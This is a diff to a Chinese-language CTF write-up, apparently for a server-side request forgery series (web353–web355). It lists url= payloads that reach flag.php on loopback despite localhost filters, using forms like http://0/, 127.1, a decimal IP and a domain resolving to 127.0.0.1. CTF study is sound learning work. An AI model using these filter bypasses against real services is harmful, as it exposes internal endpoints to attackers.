@@ -25,8 +25,23 @@ url=http://127.255.255.254/flag.php
 url=http://127.1/flag.php #127.1会被解析成127.0.0.1，也就意味着为零可缺省
 url=http://2130706433/flag.php
 ```
+### web353
+
+这里过滤了localhost和127.0.0.1
+```
+url=http://0/flag.php
+url=http://2130706433/flag.php
+```
+
 ### web354
 ```
 url=http://sudo.cc/flag.php
 ```
 查来的，我也不知道为什么。
+
+### web355
+```
+url=http://0/flag.php
+url=http://127.1/flag.php
+```
+if((strlen($host)<=5))：长度小于5
